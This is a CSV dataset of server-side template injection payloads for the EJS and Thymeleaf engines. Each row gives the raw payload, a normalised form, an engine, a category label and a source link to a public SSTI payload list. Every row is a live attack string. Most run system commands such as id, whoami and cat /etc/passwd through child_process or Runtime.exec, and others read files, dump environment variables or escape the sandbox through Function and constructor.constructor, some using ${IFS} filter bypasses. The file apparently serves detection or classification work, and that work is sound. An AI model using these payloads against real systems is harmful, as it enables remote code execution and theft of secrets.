<%= require('child_process').execSync('cat /etc/passwd').toString() %>,<%=require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('child_process').execSync('ls -la').toString() %>,<%=require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('child_process').execSync('uname -a').toString() %>,<%=require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('child_process').execSync('pwd').toString() %>,<%=require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('child_process').execSync('env').toString() %>,<%=require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('child_process').execSync('cat flag.txt').toString() %>,<%=require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('child_process').exec('id') %>,<%=require('S').exec('S')%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('child_process').exec('whoami') %>,<%=require('S').exec('S')%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('child_process').exec('cat /etc/passwd') %>,<%=require('S').exec('S')%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= require('fs').readFileSync('/etc/passwd','utf8') %>","<%=require('S').readfilesync('S','S')%>",javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= require('fs').readFileSync('flag.txt','utf8') %>","<%=require('S').readfilesync('S','S')%>",javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('fs').readdirSync('/') %>,<%=require('S').readdirsync('S')%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('fs').readdirSync('.') %>,<%=require('S').readdirsync('S')%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('os').hostname() %>,<%=require('S').hostname()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('os').userInfo() %>,<%=require('S').userinfo()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('os').networkInterfaces() %>,<%=require('S').networkinterfaces()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%- process.mainModule.require('child_process').execSync('id').toString() %>,<%-process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%- process.mainModule.require('child_process').execSync('whoami').toString() %>,<%-process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%- process.mainModule.require('child_process').execSync('cat /etc/passwd').toString() %>,<%-process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%- process.mainModule.require('child_process').execSync('ls -la').toString() %>,<%-process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%- process.mainModule.require('fs').readFileSync('/etc/passwd','utf8') %>","<%-process.mainmodule.require('S').readfilesync('S','S')%>",javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%- process.mainModule.require('fs').readFileSync('flag.txt','utf8') %>","<%-process.mainmodule.require('S').readfilesync('S','S')%>",javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%- global.process.mainModule.require('child_process').execSync('id').toString() %>,<%-global.process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%- global.process.mainModule.require('child_process').execSync('whoami').toString() %>,<%-global.process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%- require('child_process').execSync('id').toString() %>,<%-require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%- require('child_process').execSync('whoami').toString() %>,<%-require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%- require('fs').readFileSync('/etc/passwd','utf8') %>","<%-require('S').readfilesync('S','S')%>",javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<% var x = process.mainModule.require('child_process').execSync('id').toString(); %><%=x%>,<%varx=process.mainmodule.require('S').execsync('S').tostring();%><%=x%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<% var x = process.mainModule.require('child_process').execSync('whoami').toString(); %><%=x%>,<%varx=process.mainmodule.require('S').execsync('S').tostring();%><%=x%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<% var x = process.mainModule.require('child_process').execSync('cat /etc/passwd').toString(); %><%=x%>,<%varx=process.mainmodule.require('S').execsync('S').tostring();%><%=x%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<% var x = process.mainModule.require('fs').readFileSync('/etc/passwd','utf8'); %><%=x%>","<%varx=process.mainmodule.require('S').readfilesync('S','S');%><%=x%>",javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<% var x = process.mainModule.require('fs').readFileSync('flag.txt','utf8'); %><%=x%>","<%varx=process.mainmodule.require('S').readfilesync('S','S');%><%=x%>",javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('cat${IFS}/etc/passwd').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('cat$IFS/etc/passwd').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.mainModule.require('child_process').spawnSync('sh',['-c','cat</etc/passwd']).stdout.toString() %>","<%=process.mainmodule.require('S').spawnsync('S',['S','S']).stdout.tostring()%>",javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.mainModule.require('child_process').spawnSync('sh',['-c','cat<flag.txt']).stdout.toString() %>","<%=process.mainmodule.require('S').spawnsync('S',['S','S']).stdout.tostring()%>",javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('calc').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('cmd /c calc').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('cmd /c dir').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('powershell.exe').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('cmd.exe /c whoami').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.mainModule.require('child_process').spawnSync('cmd',['/c','whoami']).stdout.toString() %>","<%=process.mainmodule.require('S').spawnsync('S',['S','S']).stdout.tostring()%>",javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.mainModule.require('child_process').spawnSync('powershell',['-c','whoami']).stdout.toString() %>","<%=process.mainmodule.require('S').spawnsync('S',['S','S']).stdout.tostring()%>",javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('child_process').execSync('cmd /c whoami').toString() %>,<%=require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('child_process').execSync('powershell -c whoami').toString() %>,<%=require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('net').isIP('127.0.0.1') %>,<%=process.mainmodule.require('S').isip('S')%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('dns').lookup('localhost') %>,<%=process.mainmodule.require('S').lookup('S')%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('http').request %>,<%=process.mainmodule.require('S').request%>,javascript,EJS,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('https').request %>,<%=process.mainmodule.require('S').request%>,javascript,EJS,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('url').parse('http://example.com') %>,<%=process.mainmodule.require('S').parse('S')%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('path').resolve('/') %>,<%=process.mainmodule.require('S').resolve('S')%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('path').dirname('/etc/passwd') %>,<%=process.mainmodule.require('S').dirname('S')%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('crypto').getHashes() %>,<%=process.mainmodule.require('S').gethashes()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('crypto').getCiphers() %>,<%=process.mainmodule.require('S').getciphers()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('util').inspect(process) %>,<%=process.mainmodule.require('S').inspect(process)%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('util').inspect(global) %>,<%=process.mainmodule.require('S').inspect(global)%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('util').inspect(process.env) %>,<%=process.mainmodule.require('S').inspect(process.env)%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= Function('return this')() %>,<%=function('S')()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= Function('return process')() %>,<%=function('S')()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= Function('return global')() %>,<%=function('S')()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= Function('return process.mainModule.require(""child_process"").execSync(""id"").toString()')() %>",<%=function('S')()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= Function('return process.mainModule.require(""child_process"").execSync(""whoami"").toString()')() %>",<%=function('S')()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= Function('return process.mainModule.require(""child_process"").execSync(""cat /etc/passwd"").toString()')() %>",<%=function('S')()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= Function('return process.mainModule.require(""fs"").readFileSync(""/etc/passwd"",""utf8"")')() %>",<%=function('S')()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= constructor.constructor('return process')() %>,<%=constructor.constructor('S')()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= constructor.constructor('return global')() %>,<%=constructor.constructor('S')()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= constructor.constructor('return process.mainModule.require(""child_process"").execSync(""id"").toString()')() %>",<%=constructor.constructor('S')()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= constructor.constructor('return process.mainModule.require(""child_process"").execSync(""whoami"").toString()')() %>",<%=constructor.constructor('S')()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= constructor.constructor('return process.mainModule.require(""fs"").readFileSync(""/etc/passwd"",""utf8"")')() %>",<%=constructor.constructor('S')()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%- Function('return process.mainModule.require(""child_process"").execSync(""id"").toString()')() %>",<%-function('S')()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%- Function('return process.mainModule.require(""child_process"").execSync(""whoami"").toString()')() %>",<%-function('S')()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%- constructor.constructor('return process.mainModule.require(""child_process"").execSync(""id"").toString()')() %>",<%-constructor.constructor('S')()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<% return process.mainModule.require('child_process').execSync('id').toString() %>,<%returnprocess.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<% return process.mainModule.require('child_process').execSync('whoami').toString() %>,<%returnprocess.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<% return process.mainModule.require('child_process').execSync('cat /etc/passwd').toString() %>,<%returnprocess.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<% return process.mainModule.require('fs').readFileSync('/etc/passwd','utf8') %>","<%returnprocess.mainmodule.require('S').readfilesync('S','S')%>",javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%=JSON.stringify(process.env)%>,<%=json.stringify(process.env)%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%=JSON.stringify(process.versions)%>,<%=json.stringify(process.versions)%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%=JSON.stringify(process.config)%>,<%=json.stringify(process.config)%>,javascript,EJS,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%=JSON.stringify(process.mainModule)%>,<%=json.stringify(process.mainmodule)%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%=Object.keys(process)%>,<%=object.keys(process)%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%=Object.keys(global)%>,<%=object.keys(global)%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%=Object.getOwnPropertyNames(process)%>,<%=object.getownpropertynames(process)%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%=Object.getOwnPropertyNames(global)%>,<%=object.getownpropertynames(global)%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= this %>,<%=this%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= this.process %>,<%=this.process%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= this.global %>,<%=this.global%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= this.constructor %>,<%=this.constructor%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= this.constructor.constructor('return process')() %>,<%=this.constructor.constructor('S')()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= this.constructor.constructor('return global')() %>,<%=this.constructor.constructor('S')()%>,javascript,EJS,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= this.constructor.constructor('return process.mainModule.require(""child_process"").execSync(""id"").toString()')() %>",<%=this.constructor.constructor('S')()%>,javascript,EJS,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
${T(java.lang.Runtime).getRuntime().exec('whoami')},${t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().exec('uname -a')},${t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().exec('pwd')},${t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().exec('env')},${t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','whoami'})}","${t(java.lang.runtime).getruntime().exec(newstring[]{'S','S','S'})}",java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','cat /etc/passwd'})}","${t(java.lang.runtime).getruntime().exec(newstring[]{'S','S','S'})}",java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','id'})}","${t(java.lang.runtime).getruntime().exec(newstring[]{'S','S','S'})}",java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/sh','-c','id'})}","${t(java.lang.runtime).getruntime().exec(newstring[]{'S','S','S'})}",java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/bash','-c','id'})}","${t(java.lang.runtime).getruntime().exec(newstring[]{'S','S','S'})}",java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.String).getClass().forName('java.lang.Runtime').getRuntime().exec('id')},${t(java.lang.string).getclass().forname('S').getruntime().exec('S')},java,Thymeleaf,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(java.lang.String).getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')}","${t(java.lang.string).getclass().forname('S').getmethod('S',null).invoke(null,null).exec('S')}",java,Thymeleaf,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.System).getProperty('user.name')},${t(java.lang.system).getproperty('S')},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.System).getProperty('user.home')},${t(java.lang.system).getproperty('S')},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.System).getProperty('os.version')},${t(java.lang.system).getproperty('S')},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.System).getProperty('os.arch')},${t(java.lang.system).getproperty('S')},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.System).getProperty('java.version')},${t(java.lang.system).getproperty('S')},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.System).getProperty('java.home')},${t(java.lang.system).getproperty('S')},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.System).getProperty('java.class.path')},${t(java.lang.system).getproperty('S')},java,Thymeleaf,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.System).getenv('PATH')},${t(java.lang.system).getenv('S')},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
